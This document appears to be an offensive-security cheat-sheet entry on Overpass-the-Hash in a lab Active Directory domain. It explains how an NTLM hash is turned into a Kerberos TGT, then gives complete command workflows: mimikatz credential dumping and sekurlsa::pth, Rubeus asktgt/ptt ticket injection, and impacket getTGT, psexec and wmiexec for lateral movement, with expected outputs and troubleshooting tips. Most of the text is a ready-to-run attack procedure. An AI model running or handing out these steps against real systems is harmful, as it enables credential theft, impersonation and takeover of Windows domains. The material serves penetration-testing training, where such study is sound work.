title: Overpass-the-Hash — Turn an NTLM Hash into a Kerberos TGT
body:
Pass-the-Hash only works against NTLM-authenticating services. Overpass-the-Hash 'over'-abuses the NTLM hash to request a real Kerberos TGT, so you can then use Kerberos-only tools (like the official Microsoft PsExec) and blend into normal Kerberos traffic.

The flow: you have a user's NTLM hash (from mimikatz on a box where they were logged in). mimikatz sekurlsa::pth takes that hash and spawns a new process (usually PowerShell) whose logon session is primed with the hash. The moment that process does anything requiring domain auth, the hash is converted into a TGT by the KDC.

WHY THIS BEATS PLAIN PtH:
  - Works against Kerberos-only services (plain PtH can't)
  - The official PsExec.exe accepts Kerberos tickets but NOT password hashes — overpass bridges that gap
  - Looks like normal Kerberos activity, not anomalous NTLM

IMPORTANT whoami quirk:
  After sekurlsa::pth, running whoami in the new PowerShell shows the ORIGINAL user (e.g. jeff), not the impersonated one (jen). That's expected — whoami reads the process token, which hasn't changed; the imported Kerberos material is separate. Don't panic, it's working. Verify with klist instead.

NO TICKETS UNTIL YOU AUTHENTICATE:
  Right after pth, klist shows zero cached tickets — jen hasn't done an interactive logon. Trigger a TGT by touching a domain resource: net use \\target. THEN klist shows the TGT (Server: krbtgt) plus a TGS for the service you touched.

This is also exactly what a golden ticket does mechanically (forge/inject a ticket, then PsExec by hostname) — overpass is the 'I have the hash, let the KDC mint the ticket' version; golden is the 'I have krbtgt's hash, I mint the ticket myself' version.
cmd:
# ══════════════════════════════════════════════════
# STEP 1 — get the NTLM hash (mimikatz on a box where target was logged in)
# ══════════════════════════════════════════════════
mimikatz # privilege::debug
mimikatz # sekurlsa::logonpasswords
#   ... find the target user's session ...
#   * Username : jen
#   * NTLM     : 369def79d8372408bf6e93364cc93075

# ══════════════════════════════════════════════════
# STEP 2 — overpass: hash -> primed PowerShell session
# ══════════════════════════════════════════════════
mimikatz # sekurlsa::pth /user:jen /domain:corp.com /ntlm:369def79d8372408bf6e93364cc93075 /run:powershell
#   spawns a NEW PowerShell window primed with jen's hash

# ══════════════════════════════════════════════════
# STEP 3 — in the NEW PowerShell, trigger TGT issuance
# ══════════════════════════════════════════════════
# whoami here shows jeff (original token) — that's normal, ignore it.
klist                       # (0) cached tickets — expected, no logon yet
net use \\files04           # touch a domain resource -> KDC issues a TGT
klist                       # now shows: Server: krbtgt/CORP.COM (the TGT) + a cifs TGS

# ══════════════════════════════════════════════════
# STEP 4 — use Kerberos (official PsExec accepts tickets, not hashes)
# ══════════════════════════════════════════════════
cd C:\Tools\SysinternalsSuite
.\PsExec.exe \\files04 cmd          # uses the TGT in this session
# whoami -> corp\jen   hostname -> FILES04
# NOTE: \\files04 (hostname) for Kerberos. \\<IP> would force NTLM and fail.

# ══════════════════════════════════════════════════
# FROM KALI ALTERNATIVE — impacket does this directly
# ══════════════════════════════════════════════════
# Request a TGT from a hash and cache it, then use -k:
impacket-getTGT corp.com/jen -hashes :369def79d8372408bf6e93364cc93075
export KRB5CCNAME=jen.ccache
impacket-psexec -k -no-pass corp.com/jen@files04.corp.com


# ══════════════════════════════════════════════════
# RUBEUS WORKFLOW — asktgt -> purge -> ptt (Windows)
# ══════════════════════════════════════════════════
# Cleaner than sekurlsa::pth when you just have a hash and want a TGT
# injected into THIS session. Works non-elevated.

# Request a TGT from a password OR a hash (two equivalent ways):
.\Rubeus.exe asktgt /user:jen /password:'Nexus123!' /domain:corp.com /outfile:ticket.kirbi
.\Rubeus.exe asktgt /user:jen /rc4:369def79d8372408bf6e93364cc93075 /domain:corp.com /outfile:ticket2.kirbi
#   asktgt prints base64(ticket.kirbi) and the ASREP key; /outfile saves the .kirbi

# Two handy Rubeus verbs around this:
#   derive a user's RC4/NT hash from a password WITHOUT touching LSASS:
.\Rubeus.exe hash /user:jen /password:'Nexus123!' /domain:corp.com
#   inspect a .kirbi before you inject it (sanity-check user/realm/flags):
.\Rubeus.exe describe /ticket:ticket.kirbi

# Prove you DON'T have access yet (still your original user, e.g. stephanie):
$files04 = New-PSSession -ComputerName files04.corp.com    # -> Access is denied

# Purge, then inject the forged TGT into the current logon session:
.\Rubeus.exe purge                  # or: klist purge
.\Rubeus.exe ptt /ticket:ticket.kirbi
#   [+] Ticket successfully imported!

# Now the SAME New-PSSession succeeds — you're jen on FILES04:
$files04 = New-PSSession -ComputerName files04.corp.com
Enter-PSSession -Session $files04
#   [files04.corp.com]: PS C:\Users\jen\Documents>

# To swap identities, purge and ptt the other .kirbi (ticket2) — same steps.

# ══════════════════════════════════════════════════
# KALI WORKFLOW (expanded) — getTGT with password OR hash
# ══════════════════════════════════════════════════
# Password (mind the bang — single-quote the whole principal):
impacket-getTGT -dc-ip <DC> 'corp.com/jen:Nexus123!'
# Hash:
impacket-getTGT -dc-ip <DC> -hashes :369def79d8372408bf6e93364cc93075 corp.com/jen
export KRB5CCNAME=jen.ccache
impacket-wmiexec -k -no-pass corp.com/jen@files04.corp.com   # FQDN, not IP
impacket-psexec -k -no-pass corp.com/jen@files04.corp.com
kdestroy        # clear the cache when switching identities
warn: After sekurlsa::pth, whoami shows the ORIGINAL user, not the impersonated one — this is expected (it reads the process token, not the Kerberos material). Verify the attack worked with klist after touching a domain resource, not with whoami.

choices.label: Have an existing ticket to steal instead — pass-the-ticket
Got krbtgt hash — forge a golden ticket (persistence)
Use the ticket — PsExec to the target
Where did the hash come from? — mimikatz
Forged TGT not applying — check name vs IP / quotes
